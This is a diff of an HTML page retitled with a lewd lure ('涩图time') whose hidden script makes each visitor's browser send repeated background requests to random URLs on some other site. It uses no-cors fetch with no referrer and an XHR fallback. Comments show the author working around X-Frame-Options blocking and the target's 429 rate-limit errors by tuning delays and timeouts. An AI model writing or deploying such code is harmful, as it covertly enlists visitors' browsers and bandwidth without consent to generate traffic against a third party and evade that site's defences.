@@ -1,13 +1,12 @@
 
 
-
 <!-- 空白模版 -->
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>time</title>
+    <title>涩图time</title>
     <style>
         /* 基础样式 */
         * {
@@ -394,7 +393,7 @@
             let requestCount = 1; // 进一步减少到1个并发请求
             let requests = [];
             let lastRequestTime = 0; // 记录上次请求时间
-            let minInterval = 15000; // 最小请求间隔15秒
+            let minInterval = 30000; // 最小请求间隔30秒
             
             function createRequests() {
                 for (let i = 0; i < requestCount; i++) {
@@ -421,24 +420,31 @@
                 
                 // 方法1: 使用fetch with no-cors (主要方案，因为iframe被X-Frame-Options阻止)
                 if (typeof fetch !== 'undefined') {
-                    fetch(randomUrl, {
+                    // 使用Promise.race来检测请求是否超时
+                    const fetchPromise = fetch(randomUrl, {
                         method: 'GET',
                         mode: 'no-cors',
                         cache: 'no-cache',
                         referrer: 'no-referrer'
-                    }).then(function(response) {
-                        // no-cors模式下无法获取真实状态，但可以检查response类型
-                        if (response.type === 'opaque') {
-                            // opaque响应通常表示请求被发送但无法读取响应
-                            loadCount++;
-                            console.log(`请求已发送${loadCount}次 (页面: ${randomUrl}) - 无法确认是否成功`);
-                            const delay = 20000 + Math.random() * 10000; // 20-30秒延迟
+                    });
+                    
+                    const timeoutPromise = new Promise((resolve) => {
+                        setTimeout(() => resolve('timeout'), 5000); // 5秒超时
+                    });
+                    
+                    Promise.race([fetchPromise, timeoutPromise]).then(function(result) {
+                        if (result === 'timeout') {
+                            console.log(`请求超时：${randomUrl}`);
+                            const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
                             setTimeout(function() {
                                 makeRequest(index);
                             }, delay);
                         } else {
-                            console.log(`请求失败：${randomUrl}`);
-                            const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                            // 即使no-cors模式返回opaque，我们仍然认为请求被发送了
+                            // 但考虑到429错误，我们增加延迟时间
+                            loadCount++;
+                            console.log(`请求已发送${loadCount}次 (页面: ${randomUrl}) - 注意：可能收到429错误`);
+                            const delay = 60000 + Math.random() * 30000; // 60-90秒延迟，应对429错误
                             setTimeout(function() {
                                 makeRequest(index);
                             }, delay);
@@ -466,7 +472,7 @@
                                 }, delay);
                             } else {
                                 console.log(`请求失败：${randomUrl} - 状态码: ${xhr.status}`);
-                                const delay = 30000 + Math.random() * 20000; // 30-50秒延迟
+                                const delay = 60000 + Math.random() * 30000; // 60-90秒延迟
                                 setTimeout(function() {
                                     makeRequest(index);
                                 }, delay);
@@ -533,7 +539,7 @@
             createRequests();
             setTimeout(function() {
                 startAllRequests();
-            }, 5000); // 5秒后开始请求
+            }, 10000); // 10秒后开始请求
             setInterval(checkRequests, 3000);
             setInterval(function() {
                 const randomIndex = Math.floor(Math.random() * requestCount);
